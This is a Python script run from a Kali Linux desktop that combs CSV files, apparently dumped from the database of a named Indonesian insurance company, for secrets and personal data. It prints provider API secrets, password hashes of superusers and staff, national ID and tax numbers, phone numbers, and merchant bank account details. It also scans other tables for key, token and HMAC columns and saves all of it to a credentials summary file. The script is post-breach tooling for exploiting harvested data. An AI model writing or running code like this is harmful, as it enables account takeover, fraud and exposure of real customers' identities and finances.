#!/usr/bin/env python3
"""Extract ALL credentials, secrets, and sensitive data from harvested CSVs"""

import csv, json, sys, os
csv.field_size_limit(sys.maxsize)

DUMP_DIR = "/home/kali/Desktop/pasarpolis_harvest/db_dump"
OUTPUT = "/home/kali/Desktop/pasarpolis_harvest/db_dump/CREDENTIALS_SUMMARY.txt"

results = []

def log(msg):
    results.append(msg)
    print(msg)

log("=" * 80)
log("PASARPOLIS CREDENTIAL & SECRET EXTRACTION")
log("=" * 80)

# 1. Provider Secrets
log("\n\n### 1. PROVIDER SECRETS (pp_integrations_integrations_provider)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_integrations_integrations_provider.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            log(f"ID:{row['id']} | Provider:{row['name']} | Code:{row['code']} | Secret:{row['secret']} | Status:{row['status']}")

# 2. Partner Panel Users (with password hashes)
log("\n\n### 2. PARTNER PANEL USERS - Password Hashes (pp_partners_panel_partners_user)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_partners_panel_partners_user.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        count = 0
        internal_count = 0
        for row in reader:
            count += 1
            email = row.get('email', '')
            pwd = row.get('password', '')
            name = row.get('name', '')
            is_su = row.get('is_superuser', '')
            is_staff = row.get('is_staff', '')
            is_internal = row.get('is_internal_user', '')
            partner_id = row.get('partner_id', '')

            # Log all internal users and superusers/staff
            if is_internal == 'true' or is_su == 'true' or is_staff == 'true':
                internal_count += 1
                log(f"Email:{email} | Name:{name} | SU:{is_su} | Staff:{is_staff} | Internal:{is_internal} | PartnerID:{partner_id}")
                log(f"  Password: {pwd}")
        log(f"\nTotal partner users: {count}, Internal/Admin/Staff: {internal_count}")

# 3. Merchant Panel Users
log("\n\n### 3. MERCHANT PANEL USERS - Password Hashes + KTP (pp_merchant_panel_merchantpanel_user)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_merchant_panel_merchantpanel_user.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        count = 0
        for row in reader:
            count += 1
            email = row.get('email', '')
            pwd = row.get('password', '')
            name = row.get('name', '')
            ktp = row.get('ktp_no', '')
            npwp = row.get('npwp_no', '')
            phone = row.get('phone_no', '')
            is_su = row.get('is_superuser', '')
            user_type = row.get('user_type', '')

            if count <= 50:  # First 50 entries
                log(f"Email:{email} | Name:{name} | Phone:{phone} | KTP:{ktp} | NPWP:{npwp} | Type:{user_type}")
                log(f"  Password: {pwd}")
        log(f"\nTotal merchant users: {count}")

# 4. Operations Panel Users
log("\n\n### 4. OPS PANEL USERS - Password Hashes (pp_operations_panel_ops_user)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_operations_panel_ops_user.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        count = 0
        for row in reader:
            count += 1
            email = row.get('email', '')
            pwd = row.get('password', '')
            name = row.get('name', '')
            is_su = row.get('is_superuser', '')
            is_staff = row.get('is_staff', '')
            provider = row.get('provider', '')
            slack_id = row.get('slack_id', '')

            if is_su == 'true' or is_staff == 'true' or count <= 30:
                log(f"Email:{email} | Name:{name} | SU:{is_su} | Staff:{is_staff} | Provider:{provider} | Slack:{slack_id}")
                log(f"  Password: {pwd}")
        log(f"\nTotal ops users: {count}")

# 5. Bank Details
log("\n\n### 5. MERCHANT BANK DETAILS (pp_merchant_panel_merchantpanel_bankdetail)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_merchant_panel_merchantpanel_bankdetail.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        count = 0
        for row in reader:
            count += 1
            log(f"ID:{row['id']} | AccNo:{row['account_no']} | Holder:{row['account_holder_name']} | Bank:{row['bank_name']} | Type:{row['account_type']}")
        log(f"\nTotal bank accounts: {count}")

# 6. Partner Package configs
log("\n\n### 6. PARTNER PACKAGE MAPPINGS (pp_integrations_integrations_partnerpackage)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_integrations_integrations_partnerpackage.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        headers = None
        count = 0
        for row in reader:
            count += 1
            if headers is None:
                headers = list(row.keys())
                log(f"Columns: {headers}")
            # Look for config/secret columns
            for k, v in row.items():
                k_lower = k.lower()
                if any(sk in k_lower for sk in ['secret', 'key', 'token', 'config', 'hmac', 'auth']) and v and v not in ('', 'None', 'null'):
                    if count <= 20:
                        log(f"  {k}: {str(v)[:300]}")
        log(f"\nTotal partner packages: {count}")

# 7. Wallet Transactions summary
log("\n\n### 7. WALLET TRANSACTIONS SUMMARY (pp_wallet_core_transaction)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_wallet_core_transaction.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        headers = None
        count = 0
        for row in reader:
            count += 1
            if headers is None:
                headers = list(row.keys())
                log(f"Columns: {headers}")
        log(f"Total wallet transactions: {count}")

# 8. Payouts summary
log("\n\n### 8. PAYOUTS SUMMARY (pp_tez_payouts)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_tez_payouts.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        headers = None
        count = 0
        for row in reader:
            count += 1
            if headers is None:
                headers = list(row.keys())
                log(f"Columns: {headers}")
        log(f"Total payouts: {count}")

# 9. Insurances summary
log("\n\n### 9. INSURANCES SUMMARY (pp_core_insurances)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_core_insurances.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        headers = None
        count = 0
        for row in reader:
            count += 1
            if headers is None:
                headers = list(row.keys())
                log(f"Columns: {headers[:20]}...")
        log(f"Total insurance records: {count}")

# 10. Claims summary
log("\n\n### 10. CLAIMS SUMMARY (pp_claims_core_claim)")
log("-" * 80)
f_path = os.path.join(DUMP_DIR, "pp_claims_core_claim.csv")
if os.path.exists(f_path):
    with open(f_path, 'r') as f:
        reader = csv.DictReader(f)
        headers = None
        count = 0
        for row in reader:
            count += 1
            if headers is None:
                headers = list(row.keys())
                log(f"Columns: {headers[:20]}...")
        log(f"Total claims: {count}")

# Write summary file
with open(OUTPUT, 'w') as f:
    f.write('\n'.join(results))

print(f"\n\nSummary written to: {OUTPUT}")
